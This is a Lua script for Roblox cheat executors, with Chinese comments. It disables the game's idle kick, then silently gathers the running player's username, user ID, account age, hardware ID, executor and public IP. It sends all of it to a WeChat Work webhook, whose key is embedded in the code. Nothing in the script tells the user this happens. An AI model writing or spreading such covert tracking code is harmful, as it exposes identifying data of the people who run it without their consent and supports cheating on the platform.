local function main()
    -- 防止重复执行
    if getgenv().Ran then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            ["Text"] = "不用连续执行",
            ["Title"] = "提示",
            ["Duration"] = 3
        })
        return
    end
    getgenv().Ran = true

    local LocalPlayer = game:GetService("Players").LocalPlayer
    if not LocalPlayer then return end

    -- 设置全局通知标记
    if not _G.NotifiedWeChatWork then
        _G.NotifiedWeChatWork = true
    end

    -- 禁用玩家闲置检测（防AFK踢出）
    pcall(function()
        local connections = getconnections(LocalPlayer.Idled)
        if connections then
            for _, connection in ipairs(connections) do
                if connection and not connection.Disable then
                    connection:Disable()
                end
            end
        end
    end)

    -- 获取玩家基本信息
    local playerName = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    local playerUserId = LocalPlayer.UserId
    local accountAge = LocalPlayer.AccountAge

    -- 检测执行器类型和设备信息
    local deviceType, deviceModel, hwid, executorName, executorVersion, httpLib = "未知设备", "未知型号", "未知", "未知执行器", "未知版本", "通用库"

    pcall(function()
        -- 获取平台信息
        local platformNames = {
            [Enum.Platform.XBoxOne] = "XBox",
            [Enum.Platform.XBox360] = "XBox 360",
            [Enum.Platform.PS4] = "PlayStation 4",
            [Enum.Platform.UWP] = "Windows 10",
            [Enum.Platform.Android] = "安卓设备",
            [Enum.Platform.Windows] = "电脑",
            [Enum.Platform.PS5] = "PlayStation 5",
            [Enum.Platform.IOS] = "苹果设备"
        }
        deviceType = platformNames[game:GetService("UserInputService"):GetPlatform()] or "未知设备"

        -- 检测各种脚本执行器
        local fenv = getfenv()
        
        -- 检测Delta执行器
        if type(fenv.delta) == "table" then
            executorName = "Delta"
            httpLib = "delta.request"
        end
        
        -- 检测Codex执行器
        if type(fenv.codex) == "table" then
            executorName = "Codex"
            httpLib = "codex.request"
        end
        
        -- 检测Synapse执行器
        if type(fenv.syn) == "table" then
            executorName = "Synapse X"
            httpLib = "syn.request"
        end
        
        -- 检测Fluxus执行器
        if type(fenv.fluxus) == "table" then
            executorName = "Fluxus"
            httpLib = "fluxus.request"
        end
        
        -- 获取HWID（硬件ID）
        if type(fenv.get_hwid) == "function" then
            hwid = fenv.get_hwid() or "未知"
        end
        
        -- 检测其他执行器特征
        if not fenv.KRNL_LOADED then
            -- Krnl检测
        end
        
        if not fenv.ELECTRON_LOADED then
            -- Electron检测
        end
        
        if type(fenv.jit) ~= "table" then
            -- LuaJIT检测
        end
        
        if not fenv.pebc_execute then
            -- 其他执行器检测
            local success, executorInfo = pcall(identifyexecutor)
            if success and executorInfo then
                executorName = tostring(executorInfo)
            end
        end
    end)

    -- 获取公网IP地址
    local publicIP = "未知IP"
    pcall(function()
        local response
        local success = pcall(function()
            if syn and syn.request then
                response = syn.request({
                    Url = "https://api.ipify.org?format=text",
                    Method = "GET",
                    Timeout = 5
                })
            elseif fluxus and fluxus.request then
                response = fluxus.request({
                    Url = "https://api.ipify.org?format=text",
                    Method = "GET",
                    Timeout = 5
                })
            elseif delta and delta.request then
                response = delta.request({
                    Url = "https://api.ipify.org?format=text",
                    Method = "GET",
                    Timeout = 5
                })
            elseif codex and codex.request then
                response = codex.request({
                    Url = "https://api.ipify.org?format=text",
                    Method = "GET",
                    Timeout = 5
                })
            elseif http and http.request then
                response = http.request({
                    Url = "https://api.ipify.org?format=text",
                    Method = "GET",
                    Timeout = 5
                })
            end
        end)

        if success and response and response.StatusCode == 200 then
            local body = response.Body:gsub("%s+", "")
            if body:match("^%d+%.%d+%.%d+%.%d+$") then
                publicIP = body
            end
        end
    end)

    -- 获取游戏地图信息
    local placeId = game.PlaceId
    local jobId = game.JobId
    local placeName = "未知地图"
    
    if placeId and placeId > 0 then
        pcall(function()
            local productInfo = game:GetService("MarketplaceService"):GetProductInfo(placeId)
            if productInfo and productInfo.Name then
                placeName = productInfo.Name
            end
        end)
    end

    -- 获取当前时间
    local currentTime = os.date("!*t")

    -- 发送信息到企业微信Webhook
    pcall(function()
        local webhookData = {
            markdown = {
                content = string.format([[### 🎮 玩家注入脚本监控

**👤 玩家信息**
> 名称：%s
> 显示名：%s
> ID：%d
> 账号年龄：%d天

**📱 设备信息**
> 类型：%s
> 型号：%s
> HWID：%s

**⚙️ 执行器信息**
> 执行器：%s
> 版本：%s
> HTTP库：%s

**🌐 网络信息**
> IP：%s

**🗺️ 地图信息**
> 地图名称：%s
> 地图ID：%s
> 服务器ID：%s

**⏰ 时间**
> %d-%02d-%02d %02d:%02d:%02d UTC]],
                    playerName, displayName, playerUserId, accountAge,
                    deviceType, deviceModel, hwid,
                    executorName, executorVersion, httpLib,
                    publicIP,
                    placeName, tostring(placeId), tostring(jobId),
                    currentTime.year, currentTime.month, currentTime.day,
                    currentTime.hour, currentTime.min, currentTime.sec)
            },
            msgtype = "markdown"
        }

        local jsonData = game:GetService("HttpService"):JSONEncode(webhookData)
        
        local response
        if syn and syn.request then
            response = syn.request({
                Url = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=6dd0bb32-48c4-48f7-9539-22681fd81960",
                Method = "POST",
                Headers = {
                    ["User-Agent"] = "RobloxPlayer",
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        elseif fluxus and fluxus.request then
            response = fluxus.request({
                Url = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=6dd0bb32-48c4-48f7-9539-22681fd81960",
                Method = "POST",
                Headers = {
                    ["User-Agent"] = "RobloxPlayer",
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        -- 其他执行器的请求方式...
        end

        if response and response.StatusCode == 200 then
            -- 发送成功
        end
    end)
end

-- 安全执行主函数
pcall(main)